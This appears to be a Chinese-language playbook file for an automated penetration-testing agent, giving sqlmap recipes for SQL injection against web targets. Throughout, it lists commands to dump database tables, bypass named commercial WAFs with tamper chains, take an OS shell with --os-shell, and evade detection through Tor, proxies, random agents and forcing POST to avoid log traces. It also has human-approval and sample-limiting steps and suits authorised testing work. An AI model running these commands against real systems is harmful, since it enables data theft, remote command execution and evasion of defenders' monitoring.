---
name: sqlmap
description: sqlmap 实战 playbook — Evidence-gated 调用 / 8 大典型场景命令 / WAF 旁路 tamper / 取证拓展。atomic-rain 协议要求先手工确认信号才用 sqlmap。
category: tooling
tags: [tool, sqli, sqlmap, classic]
---

# sqlmap Playbook (classic only)

> **何时用本文件**: 已经手工确认 SQLi 信号 (见 [vuln/sqli.md §1](../vuln/sqli.md)),需要自动化拉数据 / 拓展利用面。
> **Evidence-gated**: atomic-rain P1 协议禁止裸跑 sqlmap (浪费 + WAF 封)。**手工 First-pass 确认后才用**。
> **toolPlus 替代**: 用 `mcp__yaklang__http_fuzzer` + SyntaxFlow (见 vuln/sqli.md §13)。

---

## 1. 配置

`references/tool-config.md` 中:

```yaml
sqlmap: "/path/to/sqlmap/"
```

执行: `python <配置目录>/sqlmap.py ...`。

---

## 2. 八大典型 Recipe

### 2.1 单参数确认 (信号确认后第一动作)

```bash
sqlmap -u "https://target/api?id=1" \
  --batch --random-agent --level=1 --risk=1 \
  --technique=B --threads=1
# B = Boolean,单线程,最不容易被 WAF 拦
```

### 2.2 全量请求 (Burp 复制粘贴)

```bash
# 把 Burp 请求保存为 req.txt
sqlmap -r req.txt --batch --random-agent --level=3
# 自动识别所有参数 / Header / Cookie
```

### 2.3 POST JSON Body

```bash
sqlmap -u "https://target/api/search" \
  --data='{"q":"test*"}' \
  --headers="Content-Type: application/json" \
  --batch --random-agent
# * 标记注入点
```

### 2.4 拉表名 (--tables)

```bash
sqlmap -r req.txt --dbs                          # 列数据库
sqlmap -r req.txt -D <db> --tables               # 列表
sqlmap -r req.txt -D <db> -T users --columns     # 列字段
sqlmap -r req.txt -D <db> -T users --dump --start=1 --stop=5   # 取 5 行
```

**P3.5**: 拉数据只取 5 条样本,字段脱敏后存证据。

### 2.5 时间盲注

```bash
sqlmap -r req.txt --technique=T --time-sec=5 --threads=1
# T = Time-based,单线程稳定
```

### 2.6 WAF 旁路 (tamper)

```bash
sqlmap -r req.txt --tamper=space2comment,between,charunicodeencode
# space2comment: 空格 → /**/
# between: = → BETWEEN
# charunicodeencode: 转 Unicode
```

国内 WAF 实战常用 tamper 组合:
- 阿里云盾: `space2comment,unmagicquotes,charencode`
- 腾讯 T-Sec: `between,modsecurityversioned`
- 安全狗: `space2comment,space2plus,randomcase`

### 2.7 拿 OS Shell (DBA + 危险,HITL)

```bash
sqlmap -r req.txt --os-shell
# !!! 写文件 / 执行命令 — 必须 HITL 确认
```

### 2.8 Cookie 注入

```bash
sqlmap -u "https://target/" --cookie="id=1*; sess=abc" --level=2
# Level >= 2 才测 Cookie
```

---

## 3. atomic-rain 协议集成

| 阶段 | 动作 |
| :--- | :--- |
| Phase 1 | **不用** sqlmap 做侦察 (太重 + 易被封) |
| Phase 2 §1 First-pass | 手 curl 测 1=1/1=2/sleep,确认信号 |
| Phase 2 §1 确认后 | sqlmap -r req.txt 介入 |
| Phase 2 拉数据 | `--dump --start=1 --stop=5` 取证据样本 |
| Phase 3 级联 | OS Shell / 写文件前 HITL |
| Phase 4 报告 | 截图 + Repro-Command |

---

## 4. False Positives

| 现象 | 真实判断 |
| :--- | :--- |
| sqlmap 报"is vulnerable" 但手测无 | 多半误报 — 让 sqlmap 给具体 payload 手测 |
| 拿到数据但不一致 | 时序 / 缓存问题 — `--threads=1` 重测 |
| Boolean 命中但拉不出表名 | 信息架构差异 — 试 `--dbs` 看是否真有库权限 |
| OS Shell 失败但 DBA = True | xp_cmdshell 未启 / FILE 权限缺 | 不死磕 |

---

## 5. WAF 防封 Pro Tips

- **`--threads=1`** 默认开,避免短时大量请求
- **`--delay=2`** 每请求 2s 间隔
- **`--random-agent`** 必开
- **`--proxy=http://127.0.0.1:8080`** 走 Burp,WAF 触发能看到拦截响应
- **`--method=POST`** 强制 POST 避免 GET log 留痕
- **`--tor` / `--proxy=socks5://...`** 极端情况
- **报告 OPSEC**: sqlmap session 文件含完整 dump,**报告时不要上传完整 session**

---

## 6. 替代方案 / 升级线

- toolPlus: `mcp__yaklang__http_fuzzer` + 手 payload (更快 + WAF 友好)
- 手工 binary search: 时间盲注用 Python 写 60 行脚本 = sqlmap 50% 功能
- 复杂场景 sqlmap 不强: GraphQL / WebSocket / Header / Stored SQLi
- API binding 复杂: 用 ZAP 或 Burp Active Scan 类工具

---

## 7. 相关参考

- 决策卡 / 构造: [../vuln/sqli.md](../vuln/sqli.md)
- 构造思路: [../payload-construction/sqli-construction.md](../payload-construction/sqli-construction.md)
- WAF 绕过: [../waf-bypass.md](../waf-bypass.md)
- OOB: [../oob-infrastructure.md](../oob-infrastructure.md)
